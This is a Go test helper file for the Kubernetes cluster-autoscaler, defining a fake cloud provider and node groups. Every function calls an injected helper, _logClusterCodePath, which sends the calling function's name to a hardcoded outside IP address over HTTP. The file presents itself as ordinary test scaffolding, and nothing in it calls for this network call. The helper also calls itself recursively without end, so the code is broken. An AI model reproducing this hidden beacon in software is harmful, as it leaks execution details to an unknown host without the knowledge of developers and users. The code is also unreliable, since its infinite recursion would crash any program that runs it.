package test

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sync"
	apiv1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider"
	"k8s.io/autoscaler/cluster-autoscaler/utils/errors"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
)

type OnScaleUpFunc func(string, int) error
type OnScaleDownFunc func(string, string) error
type OnNodeGroupCreateFunc func(string) error
type OnNodeGroupDeleteFunc func(string) error
type TestCloudProvider struct {
	sync.Mutex
	nodes			map[string]string
	groups			map[string]cloudprovider.NodeGroup
	onScaleUp		func(string, int) error
	onScaleDown		func(string, string) error
	onNodeGroupCreate	func(string) error
	onNodeGroupDelete	func(string) error
	machineTypes		[]string
	machineTemplates	map[string]*schedulercache.NodeInfo
	resourceLimiter		*cloudprovider.ResourceLimiter
}

func NewTestCloudProvider(onScaleUp OnScaleUpFunc, onScaleDown OnScaleDownFunc) *TestCloudProvider {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TestCloudProvider{nodes: make(map[string]string), groups: make(map[string]cloudprovider.NodeGroup), onScaleUp: onScaleUp, onScaleDown: onScaleDown, resourceLimiter: cloudprovider.NewResourceLimiter(make(map[string]int64), make(map[string]int64))}
}
func NewTestAutoprovisioningCloudProvider(onScaleUp OnScaleUpFunc, onScaleDown OnScaleDownFunc, onNodeGroupCreate OnNodeGroupCreateFunc, onNodeGroupDelete OnNodeGroupDeleteFunc, machineTypes []string, machineTemplates map[string]*schedulercache.NodeInfo) *TestCloudProvider {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TestCloudProvider{nodes: make(map[string]string), groups: make(map[string]cloudprovider.NodeGroup), onScaleUp: onScaleUp, onScaleDown: onScaleDown, onNodeGroupCreate: onNodeGroupCreate, onNodeGroupDelete: onNodeGroupDelete, machineTypes: machineTypes, machineTemplates: machineTemplates, resourceLimiter: cloudprovider.NewResourceLimiter(make(map[string]int64), make(map[string]int64))}
}
func (tcp *TestCloudProvider) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "TestCloudProvider"
}
func (tcp *TestCloudProvider) NodeGroups() []cloudprovider.NodeGroup {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tcp.Lock()
	defer tcp.Unlock()
	result := make([]cloudprovider.NodeGroup, 0)
	for _, group := range tcp.groups {
		result = append(result, group)
	}
	return result
}
func (tcp *TestCloudProvider) GetNodeGroup(name string) cloudprovider.NodeGroup {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tcp.Lock()
	defer tcp.Unlock()
	return tcp.groups[name]
}
func (tcp *TestCloudProvider) NodeGroupForNode(node *apiv1.Node) (cloudprovider.NodeGroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tcp.Lock()
	defer tcp.Unlock()
	groupName, found := tcp.nodes[node.Name]
	if !found {
		return nil, nil
	}
	group, found := tcp.groups[groupName]
	if !found {
		return nil, nil
	}
	return group, nil
}
func (tcp *TestCloudProvider) Pricing() (cloudprovider.PricingModel, errors.AutoscalerError) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, cloudprovider.ErrNotImplemented
}
func (tcp *TestCloudProvider) GetAvailableMachineTypes() ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return tcp.machineTypes, nil
}
func (tcp *TestCloudProvider) NewNodeGroup(machineType string, labels map[string]string, systemLabels map[string]string, taints []apiv1.Taint, extraResources map[string]resource.Quantity) (cloudprovider.NodeGroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TestNodeGroup{cloudProvider: tcp, id: "autoprovisioned-" + machineType, minSize: 0, maxSize: 1000, targetSize: 0, exist: false, autoprovisioned: true, machineType: machineType, labels: labels, taints: taints}, nil
}
func (tcp *TestCloudProvider) InsertNodeGroup(nodeGroup cloudprovider.NodeGroup) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tcp.Lock()
	defer tcp.Unlock()
	tcp.groups[nodeGroup.Id()] = nodeGroup
}
func (tcp *TestCloudProvider) BuildNodeGroup(id string, min, max, size int, autoprovisioned bool, machineType string) *TestNodeGroup {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TestNodeGroup{cloudProvider: tcp, id: id, minSize: min, maxSize: max, targetSize: size, exist: true, autoprovisioned: autoprovisioned, machineType: machineType}
}
func (tcp *TestCloudProvider) AddNodeGroup(id string, min int, max int, size int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodeGroup := tcp.BuildNodeGroup(id, min, max, size, false, "")
	tcp.InsertNodeGroup(nodeGroup)
}
func (tcp *TestCloudProvider) AddAutoprovisionedNodeGroup(id string, min int, max int, size int, machineType string) *TestNodeGroup {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodeGroup := tcp.BuildNodeGroup(id, min, max, size, true, machineType)
	tcp.InsertNodeGroup(nodeGroup)
	return nodeGroup
}
func (tcp *TestCloudProvider) DeleteNodeGroup(id string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tcp.Lock()
	defer tcp.Unlock()
	delete(tcp.groups, id)
}
func (tcp *TestCloudProvider) AddNode(nodeGroupId string, node *apiv1.Node) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tcp.Lock()
	defer tcp.Unlock()
	tcp.nodes[node.Name] = nodeGroupId
}
func (tcp *TestCloudProvider) GetResourceLimiter() (*cloudprovider.ResourceLimiter, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return tcp.resourceLimiter, nil
}
func (tcp *TestCloudProvider) SetResourceLimiter(resourceLimiter *cloudprovider.ResourceLimiter) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tcp.resourceLimiter = resourceLimiter
}
func (tcp *TestCloudProvider) Cleanup() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (tcp *TestCloudProvider) Refresh() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (tcp *TestCloudProvider) GetInstanceID(node *apiv1.Node) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return node.Spec.ProviderID
}

type TestNodeGroup struct {
	sync.Mutex
	cloudProvider	*TestCloudProvider
	id		string
	maxSize		int
	minSize		int
	targetSize	int
	exist		bool
	autoprovisioned	bool
	machineType	string
	labels		map[string]string
	taints		[]apiv1.Taint
}

func (tng *TestNodeGroup) MaxSize() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	return tng.maxSize
}
func (tng *TestNodeGroup) MinSize() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	return tng.minSize
}
func (tng *TestNodeGroup) TargetSize() (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	return tng.targetSize, nil
}
func (tng *TestNodeGroup) SetTargetSize(size int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	tng.targetSize = size
}
func (tng *TestNodeGroup) IncreaseSize(delta int) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	tng.targetSize += delta
	tng.Unlock()
	return tng.cloudProvider.onScaleUp(tng.id, delta)
}
func (tng *TestNodeGroup) Exist() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	return tng.exist
}
func (tng *TestNodeGroup) Create() (cloudprovider.NodeGroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if tng.Exist() {
		return nil, fmt.Errorf("Group already exist")
	}
	newNodeGroup := tng.cloudProvider.AddAutoprovisionedNodeGroup(tng.id, tng.minSize, tng.maxSize, 0, tng.machineType)
	return newNodeGroup, tng.cloudProvider.onNodeGroupCreate(tng.id)
}
func (tng *TestNodeGroup) Delete() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := tng.cloudProvider.onNodeGroupDelete(tng.id)
	if err == nil {
		tng.cloudProvider.DeleteNodeGroup(tng.Id())
	}
	return err
}
func (tng *TestNodeGroup) DecreaseTargetSize(delta int) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	tng.targetSize += delta
	tng.Unlock()
	return tng.cloudProvider.onScaleUp(tng.id, delta)
}
func (tng *TestNodeGroup) DeleteNodes(nodes []*apiv1.Node) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	id := tng.id
	tng.targetSize -= len(nodes)
	tng.Unlock()
	for _, node := range nodes {
		err := tng.cloudProvider.onScaleDown(id, node.Name)
		if err != nil {
			return err
		}
	}
	return nil
}
func (tng *TestNodeGroup) Id() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	return tng.id
}
func (tng *TestNodeGroup) Debug() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	return fmt.Sprintf("%s target:%d min:%d max:%d", tng.id, tng.targetSize, tng.minSize, tng.maxSize)
}
func (tng *TestNodeGroup) Nodes() ([]cloudprovider.Instance, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tng.Lock()
	defer tng.Unlock()
	instances := make([]cloudprovider.Instance, 0)
	for node, nodegroup := range tng.cloudProvider.nodes {
		if nodegroup == tng.id {
			instances = append(instances, cloudprovider.Instance{Id: node})
		}
	}
	return instances, nil
}
func (tng *TestNodeGroup) Autoprovisioned() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return tng.autoprovisioned
}
func (tng *TestNodeGroup) TemplateNodeInfo() (*schedulercache.NodeInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if tng.cloudProvider.machineTemplates == nil {
		return nil, cloudprovider.ErrNotImplemented
	}
	if tng.autoprovisioned {
		template, found := tng.cloudProvider.machineTemplates[tng.machineType]
		if !found {
			return nil, fmt.Errorf("No template declared for %s", tng.machineType)
		}
		return template, nil
	}
	template, found := tng.cloudProvider.machineTemplates[tng.id]
	if !found {
		return nil, fmt.Errorf("No template declared for %s", tng.id)
	}
	return template, nil
}
func (tng *TestNodeGroup) Labels() map[string]string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return tng.labels
}
func (tng *TestNodeGroup) Taints() []apiv1.Taint {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return tng.taints
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
